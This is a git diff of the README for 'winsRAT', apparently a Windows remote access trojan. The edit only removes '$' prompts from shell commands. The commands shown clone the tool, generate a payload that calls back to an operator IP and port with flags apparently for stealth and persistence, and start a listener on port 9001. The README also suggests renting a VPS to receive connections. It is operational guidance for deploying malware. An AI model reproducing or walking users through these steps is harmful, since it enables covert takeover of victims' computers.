@@ -50,9 +50,9 @@ def help_c_current(self):
 The tool is tested on **Windows** with **Python 3.13.4**. 
 Follow the steps for installation:
 ```
-$ git clone https://github.com/ThemeHackers/winsRAT
-$ cd winsRAT/
-$ pip3 install -r requirements.txt
+git clone https://github.com/ThemeHackers/winsRAT
+cd winsRAT/
+pip3 install -r requirements.txt
 ```
 
 ## Documentation
@@ -66,14 +66,14 @@ You can get the payload file in two ways:
 Source file
 
 ```
-$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}" -s -per
-$ python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\winsrat" -s -per
+python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}" -s -per
+python3 server.py generate -a 192.168.1.100 -p 9001 -o "C:\Users\1com3456\Downloads\winsrat" -s -per
 ```
 Compiled file
 
 ```
-$ python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}"
-$ python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
+python3 server.py generate -a server_ip -p server_port -o "C:\Users\{...}\Downloads\{name_output}"
+python3 server.py generate -a 192.168.1.100 -p 9001 -o  "C:\Users\1com3456\Downloads\winsrat"
 ```
 
 Replace your IP Address and Port on above commands. 
@@ -81,7 +81,7 @@ Replace your IP Address and Port on above commands.
 ### Running Server
 The server must be executed on Windows. You can buy a VPS or Cloud Server for connections. For the record, the server doesn't store any session from last run. So, all the progress will lost once the server application gets terminated. Running your server:
 ```
-$ python3 server.py bind -a 0.0.0.0 -p 9001
+python3 server.py bind -a 0.0.0.0 -p 9001
 ```
 
 ### Connections
